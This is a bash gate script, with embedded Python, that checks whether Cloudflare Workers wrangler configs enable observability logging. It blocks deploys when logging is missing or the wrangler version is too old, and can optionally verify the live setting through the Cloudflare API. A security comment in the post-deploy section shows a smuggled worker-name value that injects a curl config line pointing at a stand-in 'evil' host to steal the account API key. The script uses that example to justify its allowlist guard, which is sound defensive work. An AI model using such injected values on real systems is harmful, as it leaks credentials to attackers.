#!/usr/bin/env bash
# observability-check.sh — /ship Phase -0.35: Workers Logs must be ON.
#
# Verifies every wrangler config in a Cloudflare Workers repo declares
# `observability.enabled = true`. Without it a Worker emits NO logs at all:
# `wrangler tail` shows a live stream but nothing is RETAINED, and the
# GraphQL/dashboard error views have nothing to read. The failure mode is
# silent and only discovered during an incident, which is the worst possible
# time to learn you have no telemetry.
#
# *** THIS GATE IS A REGRESSION GUARD, NOT THE INITIAL FIX. READ THIS. ***
#   On 2026-08-29 all 51 Workers on this account were switched ON directly
#   through the Cloudflare API:
#     PATCH /accounts/<acct>/workers/scripts/<name>/settings
#     -F 'settings={"observability":{"enabled":true,"head_sampling_rate":1}};type=application/json'
#   (a JSON Content-Type is rejected — it must be that multipart part).
#   Measured before/after by re-reading the endpoint: 28 ON / 23 OFF -> 51 ON / 0 OFF.
#
#   That fixed the PRESENT. It did not fix the FUTURE. Deploying a Worker from a
#   wrangler config that has no observability block RESETS that Worker to OFF —
#   the deploy overwrites the setting the API patch established. So the config
#   block is what stops the next routine ship from silently un-instrumenting a
#   Worker that is healthy right now, and THIS GATE is what stops that deploy.
#   A green account today is not evidence the config is safe to ship.
#
# WHY invocation_logs MATTERS MORE THAN IT LOOKS
#   Invocation logs are the one-line-per-request record carrying the request
#   outcome (ok / exception / exceededCpu). Explicit console.log output is NOT
#   a substitute: a Worker that throws BEFORE reaching any console.log — a
#   webhook failing signature verification, a cron scheduled() handler dying on
#   its first await — produces zero application logs. The invocation log is the
#   only trace such a request leaves.
#
# THE SILENT-IGNORE TRAP (this is why the version check is a BLOCK, not a warn)
#   `observability` was added in wrangler 3.78.6. On an older wrangler the key
#   is accepted by the config parser and then IGNORED at deploy time. The repo
#   looks instrumented, this gate would look green, and the Worker ships blind.
#   That is a FALSE GREEN, which is worse than a missing config — so a repo
#   that declares observability on wrangler < 3.78.6 is BLOCKED, not warned.
#
# WHAT IT DELIBERATELY DOES NOT REQUIRE
#   head_sampling_rate and logs.invocation_logs are OPTIONAL. Cloudflare
#   documents "If head_sampling_rate is unspecified, it is configured to a
#   default value of 1 (100%)" (developers.cloudflare.com/workers/observability/
#   logs/workers-logs/, retrieved 2026-08-29), so a bare `enabled = true` is
#   already full-fidelity. Requiring the rich form would fail 12 correctly
#   configured repos on this account. They are reported as INFO, never blocked.
#   (The invocation_logs default is NOT explicitly documented upstream — the
#   page only shows how to DISABLE it — so the explicit form is preferred but
#   its absence is not evidence of a defect.)
#
# THREE OUTCOMES, NEVER TWO
#   0 = PASS, or not a Cloudflare Workers repo (each stated explicitly)
#   1 = BLOCK  (wrangler config present; observability missing/false, or the
#               repo's wrangler is too old for the flag to do anything)
#   2 = UNMEASURED (no python3/tomllib, unparseable config, bad usage).
#       An unmeasured result is NEVER a pass. If this script cannot read the
#       config it says so instead of reporting green.
#
# Usage: observability-check.sh <repo-dir> [--verify-deployed]
#   <repo-dir>          defaults to CWD.
#   --verify-deployed   AFTER a deploy, additionally read each Worker's LIVE
#                       setting from the Cloudflare API and require it to be ON.
#                       This is the only check that proves observability actually
#                       survived the deploy; the config check alone cannot.
#                       Omit it pre-deploy (the live value is legitimately
#                       whatever it was before this ship).
set -uo pipefail
DIR=""
VERIFY_DEPLOYED=0
for a in "$@"; do
  case "$a" in
    --verify-deployed) VERIFY_DEPLOYED=1 ;;
    -*) echo "observability-check: UNMEASURED — unknown flag: $a"; exit 2 ;;
    *) [ -z "$DIR" ] && DIR="$a" ;;
  esac
done
DIR="${DIR:-$PWD}"
cd "$DIR" 2>/dev/null || { echo "observability-check: UNMEASURED — no such dir: $DIR"; exit 2; }

MIN_WRANGLER="3.78.6"

# --- 0. locate EVERY wrangler config in the repo (not just the root one) -----
# A repo can hold several Workers (e.g. accessible-gov-form-demo has a root
# verify-worker plus hono-worker/). Checking only the root config would pass a
# repo whose second Worker is blind. Depth 3 mirrors the account-wide audit.
CFGS=$(find . -maxdepth 3 \( -name 'wrangler.toml' -o -name 'wrangler.json' -o -name 'wrangler.jsonc' \) \
        -not -path '*/node_modules/*' -not -path '*/dist/*' -not -path '*/.wrangler/*' 2>/dev/null | sort)

if [ -z "$CFGS" ]; then
  echo "observability-check: no wrangler config under $DIR — NOT a Cloudflare Workers repo, skip"
  exit 0
fi

# TOML parsing needs tomllib (Python >= 3.11). Do NOT assume `python3` has it:
# on macOS `python3` can resolve to /usr/bin/python3, which is 3.9 and has NO
# tomllib. Hardcoding `python3` there would make this gate return UNMEASURED
# forever — a gate that can never measure is a gate that never fires.
PY=""
for cand in python3 python3.14 python3.13 python3.12 python3.11 /opt/homebrew/bin/python3; do
  command -v "$cand" >/dev/null 2>&1 || continue
  if "$cand" -c 'import tomllib' >/dev/null 2>&1; then PY="$cand"; break; fi
done
[ -z "$PY" ] && {
  echo "observability-check: UNMEASURED — no Python >= 3.11 with tomllib found; cannot parse wrangler config"
  echo "  (tried: python3 python3.14 python3.13 python3.12 python3.11 /opt/homebrew/bin/python3)"
  exit 2; }

echo "observability-check: $(echo "$CFGS" | wc -l | tr -d ' ') wrangler config(s) in $DIR"

# --- 1. parse each config with a REAL parser --------------------------------
# A regex would be wrong here in a way that matters: in TOML a `[observability]`
# table placed before other top-level bare keys SWALLOWS them, so `grep
# observability` can report success on a config that actually broke `name` or
# `main`. tomllib catches that; grep cannot.
REPORT=$("$PY" - "$@" <<'PY' "$CFGS"
import json, re, sys

try:
    import tomllib
except Exception as e:                      # py < 3.11
    print(f"UNMEASURED\ttomllib unavailable ({e}) — cannot parse TOML configs")
    sys.exit(0)

def strip_jsonc(t):
    out = []; i = 0; s = lc = bc = False
    while i < len(t):
        c = t[i]; n = t[i+1] if i+1 < len(t) else ''
        if lc:
            if c == '\n': lc = False; out.append(c)
            i += 1; continue
        if bc:
            if c == '*' and n == '/': bc = False; i += 2; continue
            i += 1; continue
        if s:
            out.append(c)
            if c == '\\': out.append(n); i += 2; continue
            if c == '"': s = False
            i += 1; continue
        if c == '"': s = True; out.append(c); i += 1; continue
        if c == '/' and n == '/': lc = True; i += 2; continue
        if c == '/' and n == '*': bc = True; i += 2; continue
        out.append(c); i += 1
    return re.sub(r',\s*([}\]])', r'\1', ''.join(out))

for f in [x for x in sys.argv[-1].split('\n') if x.strip()]:
    try:
        raw = open(f, 'rb').read()
        cfg = tomllib.loads(raw.decode('utf-8')) if f.endswith('.toml') \
              else json.loads(strip_jsonc(raw.decode('utf-8')))
    except Exception as e:
        print(f"UNMEASURED\t{f}\tfailed to parse: {e}")
        continue

    o = cfg.get('observability')
    name = cfg.get('name') or '(unnamed)'
    # SECURITY / FORMAT: `name` is untrusted (it comes from the repo being
    # shipped) and this script's output is a TAB-SEPARATED, LINE-BASED record
    # that bash parses with `read`. A name containing a newline or tab would
    # split one record into two and desynchronise the parser; downstream that
    # value is also interpolated into a curl --config stream carrying the
    # X-Auth-Key header. Refuse such names at the emitter so no malformed
    # record is ever produced.
    if not isinstance(name, str) or any(c in name for c in '\t\r\n'):
        print(f"UNMEASURED\t{f}\tworker name contains a control character; refusing to use it")
        continue
    if o is None:
        print(f"MISSING\t{f}\t{name}")
    elif not isinstance(o, dict):
        print(f"UNMEASURED\t{f}\tobservability is {type(o).__name__}, expected a table/object")
    elif o.get('enabled') is False:
        print(f"DISABLED\t{f}\t{name}")
    elif o.get('enabled') is not True:
        print(f"MISSING\t{f}\t{name} (observability present but `enabled` is not true)")
    else:
        rich = (o.get('head_sampling_rate') == 1) and ((o.get('logs') or {}).get('invocation_logs') is True)
        print(f"OK\t{f}\t{name}\t{'rich' if rich else 'bare'}")
PY
)

RC=0
UNMEASURED=0
NEEDS_VERSION_CHECK=0
WORKER_NAMES=""

while IFS=$'\t' read -r verdict f rest extra; do
  [ -z "$verdict" ] && continue
  case "$verdict" in
    OK)
      NEEDS_VERSION_CHECK=1
      WORKER_NAMES="$WORKER_NAMES$rest"$'\n'
      if [ "$extra" = "rich" ]; then
        echo "  ✅ $f — observability.enabled=true (head_sampling_rate=1, invocation_logs=true)"
      else
        echo "  ✅ $f — observability.enabled=true"
        echo "     ℹ️  INFO: no explicit head_sampling_rate / logs.invocation_logs. Not a defect —"
        echo "        head_sampling_rate defaults to 1 (100%) per Cloudflare's docs. Adding"
        echo "        \`logs.invocation_logs = true\` is still preferred: its default is not"
        echo "        documented upstream, and invocation logs are the ONLY trace left by a"
        echo "        request that throws before reaching any console.log."
      fi
      ;;
    MISSING)
      echo "  ❌ BLOCK: $f — no \`observability.enabled = true\` (worker: $rest)"
      echo "     ⚠️  THIS DEPLOY WOULD TURN OBSERVABILITY OFF. Every Worker on this account"
      echo "     was switched ON via the Cloudflare settings API on 2026-08-29. Deploying"
      echo "     from a config with no observability block OVERWRITES that setting back to"
      echo "     OFF — so '$rest' is very likely instrumented RIGHT NOW and this ship is"
      echo "     what would silently blind it. The dashboard looking green is not evidence"
      echo "     that shipping this config is safe."
      echo "     Once off, the Worker RETAINS NO LOGS: \`wrangler tail\` streams live but"
      echo "     persists nothing, and the dashboard/GraphQL error views have nothing to"
      echo "     read — a production failure then leaves no evidence to debug after the fact."
      echo "     Fix (toml):   [observability]"
      echo "                   enabled = true"
      echo "                   head_sampling_rate = 1"
      echo ""
      echo "                   [observability.logs]"
      echo "                   invocation_logs = true"
      echo "     Fix (jsonc):  \"observability\": { \"enabled\": true, \"head_sampling_rate\": 1,"
      echo "                                     \"logs\": { \"invocation_logs\": true } }"
      echo "     In TOML put [observability] AFTER all top-level bare keys — a table placed"
      echo "     above them silently swallows them into itself."
      RC=1
      ;;
    DISABLED)
      echo "  ❌ BLOCK: $f — observability.enabled is explicitly FALSE (worker: $rest)"
      echo "     If this is deliberate, say why in a comment and override this phase"
      echo "     consciously; do not let a Worker ship blind by accident."
      RC=1
      ;;
    UNMEASURED)
      echo "  ⚠️  UNMEASURED: $f — $rest"
      UNMEASURED=1
      ;;
  esac
done <<< "$REPORT"

# --- 2. wrangler >= 3.78.6, else the flag is silently IGNORED at deploy ------
# Only meaningful when observability is actually declared: on an older wrangler
# the key parses fine and is dropped at deploy time, so the repo LOOKS
# instrumented and ships blind. That false green is the reason this blocks.
if [ "$NEEDS_VERSION_CHECK" = 1 ]; then
  WV=$(node -e 'try{console.log(require("./node_modules/wrangler/package.json").version)}catch(e){
    const p=(()=>{try{return require("./package.json")}catch(_){return{}}})();
    const d=(p.devDependencies&&p.devDependencies.wrangler)||(p.dependencies&&p.dependencies.wrangler);
    console.log(d?String(d).replace(/^[^0-9]*/,""):"")}' 2>/dev/null)
  SRC="repo"
  # Deliberately NOT `npx wrangler`: npx has no --no-install flag on this npm
  # (it is not in `npx --help`), and Socket Firewall MITMs TLS for npx-launched
  # wrangler on this machine. Invoke the binary directly or report UNMEASURED.
  if [ -z "$WV" ] && command -v wrangler >/dev/null 2>&1; then
    WV=$(wrangler --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    SRC="global"
  fi
  if [ -z "$WV" ]; then
    echo "  ⚠️  UNMEASURED: could not determine the wrangler version."
    echo "     observability needs >= $MIN_WRANGLER; below that the key is silently ignored"
    echo "     at deploy time and the Worker ships with no logs while looking configured."
    UNMEASURED=1
  elif ! "$PY" -c "
import sys
def v(s):
    p=[int(x) for x in s.split('.')[:3]]
    return tuple(p + [0]*(3-len(p)))
sys.exit(0 if v('$WV') >= v('$MIN_WRANGLER') else 1)" 2>/dev/null; then
    echo "  ❌ BLOCK: wrangler '$WV' ($SRC) < $MIN_WRANGLER — observability is SILENTLY IGNORED."
    echo "     The config parses, the deploy succeeds, and the Worker ships with NO logs."
    echo "     This gate would otherwise report green on a blind Worker. Upgrade wrangler."
    RC=1
  else
    echo "  ✅ wrangler $WV ($SRC) >= $MIN_WRANGLER — the observability key is honored."
  fi
fi

# --- 3b. POST-DEPLOY: read the LIVE setting from Cloudflare ------------------
# Opt-in (--verify-deployed) because pre-deploy the live value is legitimately
# whatever it was before this ship, and blocking on that would block the very
# deploy that fixes it. Run it AFTER deploying. This is the ONLY check that
# proves observability survived the deploy — the config check cannot, because a
# correct config still tells you nothing about what the deploy actually wrote.
if [ "$VERIFY_DEPLOYED" = 1 ]; then
  echo "  --- post-deploy verification (live Cloudflare settings) ---"
  CREDS="$HOME/.cloudflared/cf-global-api-key.json"
  CF_KEY=""; CF_MAIL=""; CF_ACCT="${CLOUDFLARE_ACCOUNT_ID:-}"
  if [ -f "$CREDS" ]; then
    CF_KEY=$("$PY" -c "import json;print(json.load(open('$CREDS')).get('global_api_key',''))" 2>/dev/null)
    CF_MAIL=$("$PY" -c "import json;print(json.load(open('$CREDS')).get('email',''))" 2>/dev/null)
    [ -z "$CF_ACCT" ] && CF_ACCT=$("$PY" -c "import json;print(json.load(open('$CREDS')).get('account_id',''))" 2>/dev/null)
  fi
  if [ -z "$CF_KEY" ] || [ -z "$CF_MAIL" ] || [ -z "$CF_ACCT" ]; then
    echo "  ⚠️  UNMEASURED: no Cloudflare credentials ($CREDS or CLOUDFLARE_ACCOUNT_ID)."
    echo "     Cannot confirm the deploy preserved observability. This is NOT a pass."
    UNMEASURED=1
  else
    while IFS= read -r wname; do
      [ -z "$wname" ] && continue
      [ "$wname" = "(unnamed)" ] && { echo "  ⚠️  UNMEASURED: a config has no \`name\`; cannot query it."; UNMEASURED=1; continue; }
      # SECURITY: `wname` comes from a wrangler config, i.e. from the repo being
      # shipped - untrusted input. It is interpolated into BOTH a URL and a curl
      # --config stream that also carries the X-Auth-Key header. A TOML name
      # containing \n parses to a REAL newline, so `name = "x\nurl = \"http://evil\""`
      # would append a directive to that stream and POST a full-account Cloudflare
      # key to an attacker. Allowlist the characters Cloudflare actually permits in
      # a script name (alphanumerics, dot, underscore, hyphen) and refuse anything
      # else. Refuse loudly: UNMEASURED, never a silent skip.
      case "$wname" in
        *[!A-Za-z0-9._-]*|"")
          echo "  ⚠️  UNMEASURED: worker name contains characters outside [A-Za-z0-9._-];"
          echo "     refusing to build a request from it (config-injection guard)."
          UNMEASURED=1; continue ;;
      esac
      # Credentials go in via `curl --config -` (stdin), NOT `-H "X-Auth-Key: $KEY"`.
      # Command-line arguments are world-readable in `ps` on this machine, so the
      # -H form leaks a FULL-ACCOUNT Cloudflare key to any local process for the
      # lifetime of the request. --config keeps it off the argument list.
      BODY=$(printf 'silent\nshow-error\nmax-time = 20\nheader = "X-Auth-Email: %s"\nheader = "X-Auth-Key: %s"\nurl = "%s"\n' \
        "$CF_MAIL" "$CF_KEY" \
        "https://api.cloudflare.com/client/v4/accounts/$CF_ACCT/workers/scripts/$wname/settings" \
        | curl --config - 2>/dev/null)
      VERDICT=$(printf '%s' "$BODY" | "$PY" -c '
import json,sys
try: d=json.load(sys.stdin)
except Exception: print("UNMEASURED\tunparseable API response"); raise SystemExit
if not d.get("success"):
    print("UNMEASURED\t" + str(d.get("errors"))); raise SystemExit
o=(d.get("result") or {}).get("observability")
if not isinstance(o,dict): print("OFF\tno observability object in settings")
elif o.get("enabled") is True: print("ON\thead_sampling_rate=%s" % o.get("head_sampling_rate"))
else: print("OFF\tenabled=%r" % o.get("enabled"))' 2>/dev/null)
      case "${VERDICT%%$'\t'*}" in
        ON)  echo "  ✅ $wname — LIVE observability is ON (${VERDICT#*$'\t'})" ;;
        OFF) echo "  ❌ BLOCK: $wname — LIVE observability is OFF after deploy (${VERDICT#*$'\t'})."
             echo "     The deploy RESET it. Add the observability block to this Worker's"
             echo "     wrangler config and redeploy, or re-PATCH the settings endpoint."
             RC=1 ;;
        *)   echo "  ⚠️  UNMEASURED: $wname — could not read live settings (${VERDICT#*$'\t'})"
             UNMEASURED=1 ;;
      esac
    done <<< "$WORKER_NAMES"
  fi
fi

# --- 3. the config is not the deployed state --------------------------------
echo "  ↳ REMINDER: observability takes effect on the NEXT DEPLOY. A config edit alone"
echo "     changes nothing — a Worker last deployed before this commit is still blind."
echo "     Confirm retention after deploying, e.g. account-wide via the GraphQL"
echo "     workersInvocationsAdaptive dataset or the Workers Observability dashboard."

# UNMEASURED is never a pass, but a real BLOCK outranks it (rc=1 is more actionable).
if [ "$RC" = 1 ]; then
  echo "observability-check: BLOCK (rc=1)"
  exit 1
fi
if [ "$UNMEASURED" = 1 ]; then
  echo "observability-check: UNMEASURED (rc=2) — not a pass; resolve before shipping"
  exit 2
fi
echo "observability-check: PASS"
exit 0
